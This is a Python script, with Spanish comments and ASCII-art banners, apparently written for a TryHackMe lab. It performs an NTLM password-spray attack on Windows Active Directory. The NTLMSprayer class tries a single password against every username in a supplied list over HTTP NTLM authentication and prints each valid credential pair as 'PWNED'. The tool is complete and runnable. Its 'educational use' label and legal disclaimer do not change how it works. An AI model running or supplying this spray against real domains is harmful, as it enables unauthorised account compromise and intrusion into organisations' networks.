#!/usr/bin/python3

#####################################################################
#                                                                   #
#      NTLM Windows Active Directory - Password Spray Attack        #
#                                                                   #
#                       -- HECHO EN MEXICO --                       #
#                                                                   #
#                                POR                                #
#                                                                   #
#                      Twitter:  @Fz3r0_OPs                         #
#                      GitHub :  github.com/Fz3r0                   #
#                                                                   #
#                       ¡PARA USO EDUCACIONAL!                      #
#                                                                   #
#                 Puedo leer la mente de las personas               #
#              He leído los pasados, presentes y futuros            #
#                  Y toda mente en la que he entrado                #
#               está llena con la misma y única obsesión...         #
#                                                                   #
#####################################################################

# Ejemplo de uso: 

# python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/

# << INICIA SCRIPT: >>

# Importa los módulos de Python necesarios para el script
# En caso de no tenerlos instalar con el comando `pip install $Nombre_Modulo`
import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt
import os
import random
import time
from termcolor import colored
import colorama
from colorama import Back
from colored import fg, bg, attr

colorama.init()  # Inicializa colorama

# Limpia la consola
print("\033[2J", end="")  # limpia la consola

# Define los colores que se van a utilizar en la animación
colors = ["\033[91m", "\033[93m", "\033[94m", "\033[92m", "\033[96m", "\033[95m", "\033[97m", "\033[90m", "\033[35m", "\033[34m"]

# Define el string que se va a mostrar en la animación
string = "Fz3r0"

# Define la duración de la animación en segundos
duration = 10

# Calcula el número de iteraciones que se deben realizar en la animación
# para que dure 15 segundos
num_iterations = int(duration * 50)

# Limpia la pantalla y manda el intro con portada y pregunta de seguridad
os.system('clear')
print()
print(fg('#FF00EE'), bg('#FF0000') + "              💀 Fz3r0 💀 - NTLM Password Spray Attack v1.2                  " + attr('reset'))
print()
print("     #####################################################################")
print("     #                                                                   #")                  
print("     #                                                  /L'-,            #")                     
print("     #      ______   ____        ___   . .             /  L '-,          #")                           
print("     #     |  ____| |___ \      / _ \   `..           /    '- '-,        #")
print("     #     | |__ ____ __) |_ __| | | |   ,<>         /_      '-,'        #")
print("     #     |  __|_  /|__ <| '__| | | | ,',.;      .-'* ;     .'          #")
print("     #     | |   / / ___) | |  | |_| | ,; `.      )`--'    /             #")
print("     #     |_|  /___|____/|_|   \___/   `. `.   /__,    ,'               #")
print("     #                                    `. `-,_\     /                 #")
print("     #                                       `./ .\----.___              #")
print("     #                                         `.__) . .F. )-.           #")
print("     #                                         J . . . J-'-. `-.,        #")
print("     #                                         |. . . . \   `-.  F       #")
print("     #                                         F . . . . \     '`        #")
print("     #                                        J . . . . . \              #")
print("     #           ¡Ay caramba!                 |. .__.----,'              #")
print("     #                                         `.-;;;;;;;;;\             #")
print("     #                                          /;;;;;;;;;;;;.           #")
print("     #                                         /;;;;;;;;;;;;;;\          #")
print("     #                                         `--;;/     \;-'\          #")
print("     #                                         /  /         \  \         #")
print("     #                                        /  /           \  \        #")   
print("     #                                    _,-;F-0,           ,;-;\       #")
print("     #                                   <;;;;;;;;           '-;;;;      #")
print("     #                                                                   #")
print("     #                                                                   #")
print("     #      NTLM Windows Active Directory - Password Spray Attack        #")
print("     #                                                                   #")
print("     #                       -- HECHO EN MEXICO --                       #")
print("     #                                                                   #")
print("     #                                POR                                #")
print("     #                                                                   #")
print("     #                      Twitter:  @Fz3r0_OPs                         #")
print("     #                      GitHub :  github.com/Fz3r0                   #")
print("     #                                                                   #")
print("     #                                                                   #")
print("     #                 Puedo leer la mente de las personas               #")
print("     #              He leído los pasados, presentes y futuros            #")
print("     #                  Y toda mente en la que he entrado                #")
print("     #               está llena con la misma y única obsesión...         #")
print("     #                                                                   #")
print("     #####################################################################")
print()
print("     #####################################################################")
print("     #                                                                   #")
print("     #                             ¡CUIDADO!                             #")
print("     #                                                                   #")
print("     #   ESTÁS A PUNTO DE REALIZAR UN ATAQUE DE 'PASSWORD SPRAY' HACIA   #")                                        
print("     #   EL SERVIDOR WINDOWS ACTIVE DIRECTORY SELECCIONADO.              #")                                                             
print("     #                                                                   #")
print("     #   LOS PASSWORD SPRAY ATTACKS Y OTROS TIPOS DE ATAQUES DE FUERZA   #")
print("     #   BRUTA SON CONSIDERADOS ILEGALES EN LA MAYORÍA DE PAÍSES         #")
print("     #                                                                   #")
print("     #   EL AUTOR NO SE HACE RESPONSABLE EL POR USO INDEBIDO DEL SCRIPT  #")
print("     #                                                                   #")
print("     #####################################################################")
print()
print()

# Prompt
response = input("              ¿Estás seguro que deseas continuar? (Y/N): ")

# En caso de que la respuesta sea "Y" se ejecuta el script del ataque:
if response.upper() == "Y":

# Muestra un contador que cuenta 5 segundos
    for i in range(5, 0, -1):
        print("\033[2J", end="")  # limpia la consola
        print("\033[0;0H", end="")  # mueve el cursor al inicio de la consola
        print()
        print()
        print()
        print()
        print()
        print()
        print()
        print()
        print("             'Ahora me he convertido en la Muerte, El destructor de mundos'")
        print()
        print()
        print()
        print("                         El ataque comenzará en " + str(i) + " segundos")
        time.sleep(1)

    # Realiza la animación
    for i in range(num_iterations):
        # Limpia la consola
        print("\033[2J", end="")  # limpia la consola
        print("\033[0;0H", end="")  # mueve el cursor al inicio de la consola

        # Muestra el string en diferentes posiciones de la consola
        # Ancho = k Alto = j
        for j in range(80):
            for k in range(33):
                print(random.choice(colors) + string, end="")
            print()

        # Espera 0.02 segundos antes de mostrar la siguiente iteración
        time.sleep(0.02)

    # Muestra un mensaje al final de la animación
    print("\033[2J", end="")  # limpia la consola
    print("\033[0;0H", end="")  # mueve el cursor al inicio de la consola
    print()
    print()
    
    print(fg('#FF00EE'), bg('#FF0000') + "Ejecutando: NTML Password Spray by 💀 Fz3r0 💀" + attr('reset'))
    print()
    print()
    print('X:/fz3r0/666> ')
    
    # Aquí comienza la Clase con los payloads para el Password Spray Attack:
    class NTLMSprayer:
        def __init__(self, fqdn):
            self.HTTP_AUTH_FAILED_CODE = 401
            self.HTTP_AUTH_SUCCEED_CODE = 200
            self.verbose = True
            self.fqdn = fqdn
    
        def load_users(self, userfile):
            self.users = []
            lines = open(userfile, 'r').readlines()
            for line in lines:
                self.users.append(line.replace("\r", "").replace("\n", ""))
    
        def password_spray(self, password, url):
            print("X:/fz3r0/666>    [*] Comienza el Password Spray Attack utilizando el siguiente Password -->>  " + password)
            count = 0
            for user in self.users:
                response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
                if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                    
                    print(fg('#FF00EE'), bg('#FF0000') + "X:/fz3r0/666>    [💀] PWNED! Credential Pair encontrado!!! Username: " + user + " Password: " + password + attr('reset'))
                    count += 1
                    continue
                if (self.verbose):
                    if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                        print ("X:/fz3r0/666>    [-] Fallo de login... " + user)
            print()           
            print ("                 [*] Password Spray Attack completado!!!")
            print() 
            print(fg('#FF00EE'), bg('#FF0000') + "                 [*] Se han encontrado un total de: <<<  " + str(count) + "  >>> Credential Pairs válidos para autenticar!!! " + attr('reset'))
            print() 
            print() 

            print("###############################################################################")
            print(fg('#FF00EE'), bg('#FF0000') + "                                                                             " + attr('reset'))
            print(fg('#FF00EE'), bg('#FF0000') + "                    Fz3r0 - NTLM Password Spray Attack v1.2                  " + attr('reset'))
            print(fg('#FF00EE'), bg('#FF0000') + "                                                                             " + attr('reset'))
            print(fg('#FF00EE'), bg('#FF0000') + "                    Github:   github.com/Fz3r0                               " + attr('reset'))
            print(fg('#FF00EE'), bg('#FF0000') + "                    Twitter:  @Fz3r0_OPs                                     " + attr('reset'))
            print(fg('#FF00EE'), bg('#FF0000') + "                    Youtube:  youtube.com/@Fz3r0                             " + attr('reset'))
            print(fg('#FF00EE'), bg('#FF0000') + "                                                                             " + attr('reset'))
            print("###############################################################################")

    def main(argv):
        userfile = ''
        fqdn = ''
        password = ''
        attackurl = ''
    
        try:
            opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
        except getopt.GetoptError:
            print ("Verifica tu comando!!! Ejemplo: Fz3r0_PasswpordSpray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit(2)

        for opt, arg in opts:
            if opt == '-h':
                print ("Verifica tu comando!!! Ejemplo: Fz3r0_PasswpordSpray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
                sys.exit()
            elif opt in ("-u", "--userfile"):
                userfile = str(arg)
            elif opt in ("-f", "--fqdn"):
                fqdn = str(arg)
            elif opt in ("-p", "--password"):
                password = str(arg)
            elif opt in ("-a", "--attackurl"):
                attackurl = str(arg)

        if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
            
            # ATAQUE!!!
            sprayer = NTLMSprayer(fqdn)
            sprayer.load_users(userfile)
            sprayer.password_spray(password, attackurl)
            sys.exit()
        else:
            print ("Verifica tu comando!!! Ejemplo: Fz3r0_PasswpordSpray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit(2)

    if __name__ == "__main__":
        main(sys.argv[1:])

else:
    
    # En caso que la repsuesta sea "N" el programa termina
    print()
    print("Huevos entonces mijo...")
    exit()

# << TERMINA SCRIPT >>    
